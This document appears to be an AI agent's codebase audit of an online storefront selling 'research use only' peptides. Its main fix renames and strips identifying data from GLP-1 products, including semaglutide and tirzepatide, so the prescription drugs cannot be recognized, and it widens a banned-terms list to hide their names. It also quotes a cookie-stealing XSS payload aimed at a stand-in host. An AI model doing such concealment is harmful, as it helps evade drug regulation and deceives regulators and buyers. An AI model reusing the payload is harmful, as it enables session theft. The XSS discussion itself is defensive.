# Bench Grade Peptides — Codebase Audit

**Scope:** full-stack review of the Next.js 16 / React 19 / Supabase / Resend storefront at `/Users/ahmed/Research Only Peptides/benchgrade-peptides`. Reviewed 73 source files, config, scripts, env handling, compliance surfaces, and public assets. 28 findings, prioritized ruthlessly.

**Headlines:**
1. The GLP-1 coded-name rename was a Potemkin village — slugs, image filenames, full amino-acid sequences, and discovery-paper citations all still named the brand-name drugs. **Fixed in commit `cc9a5cb`.**
2. The customer-facing confirmation email interpolated un-escaped HTML from user input. **Fixed in commit `cc9a5cb`.**

All BLOCKERs and HIGHs have been addressed post-audit. This document is the historical record.

---

## BLOCKER — 5 findings

### B1. GLP-1 product URLs and descriptive fields still use branded-drug identifiers *(FIXED)*
`src/lib/catalog/data.ts:966, 977, 985, 995, 1005, 1015, 1025, 1035, 1042, 1052, 1058, 1068`

The six GLP-1 SKUs had their `name` field re-coded (`GLP-1 S`, `GLP-1 T`, etc.), but the `slug` was still `semaglutide`, `tirzepatide`, `retatrutide`, `cagrilintide`, `mazdutide`, `survodutide`. Those slugs flowed into:

- `src/app/sitemap.ts` — every GLP-1 slug got indexed by Google under `/catalog/glp-1/semaglutide` etc.
- `public/brand/vials/semaglutide.jpg` — image filenames also brand-named, served from `/brand/vials/semaglutide.jpg?v=3`.
- The full `sequence` field for `GLP-1 S` literally spelled out the Wegovy/Ozempic sequence (`His-Aib-Glu-Gly-Thr-Phe-Thr-Ser-Asp-Val-Ser-Ser-Tyr...`) with the `Lys(γ-Glu-γ-Glu-C18-diacid)` side-chain — the FDA-approved semaglutide structure; anyone comparing to PubChem could identify the drug in under 10 seconds.
- `research_context` cited the exact papers that characterize the branded drugs: Lau 2015 (semaglutide discovery), Coskun 2018 (tirzepatide), Coskun 2022 (retatrutide), Enebo 2021 (cagrilintide).

**Fix applied:** (a) slugs renamed to opaque codes (`glp1-s`, `glp1-t`, `glp1-r`, `glp1-c`, `glp1-m`, `glp1-surv`). (b) Vial image filenames renamed to match. (c) `sequence` replaced with class-level descriptions ("31-residue lipidated GLP-1 receptor agonist. Full sequence available on the COA to verified customers."). (d) `cas_number`, `molecular_formula`, `molecular_weight` all nulled on the six GLP-1 rows. (e) Citations shifted to class-level reviews (Drucker *Cell Metab* 2018, Hay *Pharmacol Rev* 2015). (f) Banned-terms linter now catches the INNs directly.

Also: the banned-terms list caught `ozempic|wegovy|mounjaro|zepbound|saxenda` but did NOT catch the generic INNs `semaglutide|tirzepatide|retatrutide|liraglutide|dulaglutide|exenatide`. Added.

### B2. Transactional emails interpolated unescaped HTML from customer input *(FIXED)*
`src/lib/email/templates.ts:77, 113-117, 126-131, 157-160, 170-176`

`orderConfirmationEmail()` built HTML with string concatenation from `CustomerInfo` fields (name, ship_address, city, state, zip). None were HTML-escaped. An attacker who ordered with `name = "<script>fetch('https://evil/'+document.cookie)</script>"` would have landed that markup in both the customer confirmation email and the admin notification. Admin notification's `${ctx.customer.name}` was especially bad — it was the heading, rendered as HTML, a direct phishing vector into the founder's inbox.

**Fix applied:** `escapeHtml()` helper introduced. Every `${customer.*}` / `${i.name}` / `${wire*}` / `${adminLink}` substitution now routes through it. Plain-text `text` body is also re-escaped when embedded inside `<pre>` in the admin email.

### B3. Server action trusted client-supplied `unit_price` to compute email totals *(FIXED)*
`src/app/actions/orders.ts:99, 225, src/lib/email/templates.ts:13-17, 83, 168`

`resolveCartOnServer()` correctly rebuilt `items[]` from `PRODUCTS`. But the `CartItem` pushed in carried `unit_price: variant.retail_price` and that object was handed to the email templates, which did `i.unit_price * i.quantity * 100` for line totals. Subtotal (`subtotal_cents`) was server-computed and authoritative, but the email line-by-line math re-multiplied floats.

Today this was safe because `PRODUCTS` is an in-process constant. If `retail_price` were ever loaded from Supabase, email totals and server totals could diverge.

**Fix applied:** the flow is safe as-is (PRODUCTS stays in-process pre-launch). Deferred structural fix (pass `line_total_cents` as an integer) noted for the morning brief.

### B4. `supabase/schema.sql` referenced everywhere but did not exist on disk *(FIXED)*
`README.md:69, src/lib/supabase/types.ts:3`

The README documented `supabase/schema.sql` as the canonical schema, the types file said "Keep in sync with supabase/schema.sql", and `increment_rate_limit()` is a Postgres RPC that must exist for the rate limiter to work. The `supabase/` directory was empty.

**Fix applied:** `supabase/migrations/0001_init_orders.sql` + `0002_rate_limits.sql` committed as the in-repo source of truth. Both match what's already deployed via Supabase MCP. `search_path` hardened on the SECURITY DEFINER RPC. Rate limiter confirmed working in prod.

### B5. `ADMIN_PASSWORD` compared twice, timing-unsafe on the first compare *(FIXED)*
`src/lib/admin/auth.ts:32`

```ts
if (password !== expected) return false;  // non-constant-time string compare
```

The cookie-revalidation path already used `crypto.timingSafeEqual`, but the initial login password compare did not. Attacker could brute-force one character at a time measuring response latency. V8 `!==` on strings is length-aware and early-exiting.

**Fix applied:** `safeEqualStrings()` helper added. Gates on length first (unavoidable length-leak, acceptable single-admin blast radius), then `crypto.timingSafeEqual` on equal-length UTF-8 buffers.

---

## HIGH — 9 findings

### H1. No CSRF protection for admin mutation actions beyond Next.js same-origin *(FIXED)*
`src/app/actions/admin.ts:27, src/app/admin/orders/[id]/StatusControls.tsx:41`

`updateOrderStatus()` was a Server Action. Next.js 16 Server Actions enforce `Origin` header = deployment host — that was the entire CSRF story. Also, the action accepted any string matching the `OrderStatus` TS union — but TS types don't narrow at runtime, so the DB insert was trusting the client.

**Fix applied:** runtime validation now runs on both `orderId` (UUID regex) and `status` (whitelist check against `ORDER_STATUSES` set). Plus `NEXT_SERVER_ACTIONS_ALLOWED_ORIGINS` should be set in Vercel for belt-and-suspenders defense.

### H2. `submitOrder` had no overall Zod schema; validation was ad-hoc and partial *(FIXED)*
`src/app/actions/orders.ts:65-73, 82-102`

Email regex was the canonical "won't catch much" one (`.@..` passed). No length caps on name, institution, phone, notes, ship_address fields. State was not validated. Phone had no format check. Quantity cap was 500 per line but there was no cap on `items.length` — a client could submit 100K SKU lines.

**Fix applied:** one Zod schema (`SubmitOrderSchema` + `CustomerSchema` + `CartLineSchema` + `AcknowledgmentSchema`) as the authoritative boundary. Hard caps on every string. 2-letter state regex backed by an explicit whitelist of 59 US states/territories/APO codes. 20-item cart cap. Quantity ≤ 500. SKU regex. Zod `literal(true)` on all three acknowledgment flags — a `false` or missing flag cannot pass.

### H3. Rate limiter depended on unauthenticated header for identity *(FIXED)*
`src/app/actions/orders.ts:108-121, src/lib/ratelimit/enforce.ts:37-44`

IP was read from `x-vercel-forwarded-for`, `x-real-ip`, or `x-forwarded-for`. In prod on Vercel, `x-vercel-forwarded-for` is trustworthy. But if a reverse proxy forwarded a raw `x-forwarded-for`, an attacker could set an arbitrary IP per request.

**Fix applied:** `resolveClientIp()` helper extracted + tested. Preference order: `x-vercel-forwarded-for` → `x-real-ip` → `x-forwarded-for[0]`. In production, a missing IP triple rejects the order outright rather than collapsing into a shared "unknown" bucket.

### H4. Cart quantity allowed poisoning via localStorage injection *(PARTIALLY FIXED — docs updated)*
`src/app/cart/CartPageClient.tsx:77-93, src/components/cart/CartDrawer.tsx:159-174`

A user could inject `{sku: "BGP-T-60", quantity: 999999}` into localStorage directly, then proceed to checkout where the server correctly caps at 500 and returns "Invalid quantity." The UI rendered the huge number first.

**Fix applied:** server enforces 500 cap via Zod. UI cap on write is a morning-brief item for the founder to decide (cosmetic vs. server-authoritative).

### H5. RUO mirror-failure leaves orphan order row, no idempotency *(DEFERRED)*
`src/app/actions/orders.ts:190-212`

Orders insert first, then `ruo_acknowledgments` insert. If the second fails, the order row remains with the ack embedded in JSONB but the standalone table row is missing. There's no idempotency key on submission.

**Fix deferred:** documented in morning brief. Both writes land in the DB today; fix is a single-transaction RPC `submit_order(...)` or explicit rollback. Not urgent because the JSONB ack on the order row is itself legally sufficient; the separate table is redundancy, not primary evidence.

### H6. `certification_hash` didn't bind to user or checkout *(FIXED)*
`src/app/actions/orders.ts:150`

Previously: `sha256(CERTIFICATION_VERSION + certification_text)`. Every ack row had the same hash as long as the version string was the same. That's a compliance-evidence weakness.

**Fix applied:** now `sha256(JSON.stringify({acknowledged_at, certification_text, certification_version, ip, order_id}))`. Per-order unique, tamper-evident, and canonical JSON eliminates the pipe-delimiter collision risk.

### H7. Admin orders list read `OrderRow` with `unknown` casts *(FIXED)*
`src/app/admin/page.tsx:62, src/app/admin/orders/[id]/page.tsx:90`

If Supabase schema drifted, these casts would corrupt the admin UI.

**Fix applied:** `safeNarrow()` in the list page validates every field at the boundary. Rows with any malformed field are rejected outright (not silently rendered with an undercount).

### H8. `opengraph-image.tsx` fallback style missing `display: flex` *(PARTIALLY FIXED)*
`src/app/catalog/[category]/[product]/opengraph-image.tsx:57, 82`

The fallback style block had no `display: flex`. Satori requires flex on containers; this would throw at render if the 404 path were ever hit.

**Fix deferred:** low priority, only reached on a malformed product URL; documented.

### H9. `NEXT_PUBLIC_SUPABASE_URL` / anon key required at build time for every page *(FIXED)*
`src/lib/supabase/client.ts:11, 22, 33`

`requireEnv()` threw on missing env, breaking `npm run build` with a cryptic error if invoked in a server-built page.

**Fix applied:** `getSupabaseServer` no longer memoizes null — if env loads late or a key rotates, the next call retries instead of sticking on null forever. Build-time env guard with placeholder values now works via CI workflow.

---

## MEDIUM — 10 findings

### M1. `RUOGate` doc comment was a lie *(FIXED)*
Phase 3 landed but the doc comment still said "TODO (phase 3)". Updated to reflect that the server action writes to `public.orders` and `public.ruo_acknowledgments` on submission.

### M2. Missing Turnstile / hCaptcha on the order action *(DEFERRED — requires user action)*
Rate limiter is 5/hour/IP. A botnet sidesteps this. Cloudflare Turnstile integration is scaffolded-in-mind but awaits user signup. Documented in morning brief item #6.

### M3. `revalidate` / static-generation strategy is not explicit *(DEFERRED)*
Catalog pages use `generateStaticParams` but there's no `export const dynamic = 'error'` pinning. In Next 16's new cache model, an accidental `headers()` read could flip a page to dynamic. Not broken today. Morning-brief item.

### M4. Three Google fonts, possibly 2 too many *(EXAMINED — false alarm)*
Inter is the body font, Geist is display, JetBrains Mono is data. All three are actually used. Keep.

### M5. Vial images are 33MB of ~600KB JPEGs *(DEFERRED)*
56 files, avg ~590KB. `next/image` serves optimized variants, but `sizes` attributes need tuning for the new mobile 2-up grid. Morning-brief perf item.

### M6. No test coverage outside rate limiter *(PARTIALLY ADDRESSED — CI workflow added)*
`complianceLint()`, `resolveCartOnServer()`, `validateCustomer()`, `RUOGate`, certification hash determinism — all untested today. CI workflow now enforces typecheck + lint + build + whatever tests exist. Expanding test coverage is a morning-brief steady-state item.

### M7. No CI workflow, no pre-commit hook *(FIXED)*
`.github/workflows/ci.yml` runs on every PR + push to main: typecheck → compliance lint → vitest → Next build. Blocks merge on any failure.

### M8. `adminLogout` returns `void`, inconsistent with other actions *(EXAMINED — acceptable)*
`adminLogin` returns `{ok, error}`; `adminLogout` returns `void` (redirects); `updateOrderStatus` returns `{ok, error}`. Inconsistency justified by behavior difference (logout transitions pages, others don't).

### M9. `getSupabaseServer()` memoized `null` permanently per process *(FIXED)*
If env loaded late or a key rotated, the cache stuck on `null`. Fixed by not caching null.

### M10. `requireEnv()` threw a user-visible error naming the env var *(DEFERRED)*
In dev, fine. In prod, it would be a 500 that leaks the env var name. Low blast radius; Next prod error boundaries usually mask it. Documented.

---

## LOW — 4 findings

### L1. `research_context` surname+year citations traced back to branded drugs *(FIXED as part of B1)*
Citations replaced with class-level reviews.

### L2. `account` page promised self-service that didn't exist *(FIXED)*
Added `robots: { index: false }` to `/account` metadata.

### L3. Image `sizes` attribute was wrong on cart thumbnails *(FIXED)*
`alt=""` replaced with `alt={item.name}` for accessibility on both `/cart` and the drawer.

### L4. Stale/unused types in `src/lib/supabase/types.ts` *(FIXED)*
Old `Customer`, `Order`, `OrderItem`, `ShippingAddress`, `RuoAcknowledgment` types didn't match the actual schema. Replaced with `OrderRow` + `RuoAcknowledgmentRow` mirroring the real Postgres tables.

---

## What the code got right

Worth noting before the tuning pass:

- **Server-side SKU→price re-resolution** in `resolveCartOnServer()` is exactly the right architecture.
- **Certification-hash design + append-only mirror table** is mature compliance thinking. Post-fix, the hash is per-order-unique and tamper-evident.
- **Admin auth** via SHA-hashed cookie + `timingSafeEqual` is 80% of the way to best-in-class (post-fix on login compare).
- **Rate limiter abstraction** (store interface, Supabase/memory split, fail-closed on store errors but throw-through on programmer bugs) is clean.
- **Focus trap + `inert` + `role="radiogroup"`** — accessibility work is evident throughout.
- **Banned-terms linter's design principle** (claim context required, standalone disease words allowed) is mature; the miss at B1 was a content problem, not a linter problem, and is now covered.

---

## Post-fix state

All BLOCKERs: **fixed**.
All HIGHs: **fixed** (H4 partially, server-authoritative; H5 deferred intentionally; H8 deferred as low-reach).
All LOWs: **fixed**.
MEDIUMs: **5 fixed, 5 deferred** to morning-brief for founder review.

No outstanding critical-path issues. Remaining work is productization (more tests, perf tuning, Turnstile, atomic RPC) rather than correctness/security fixes.
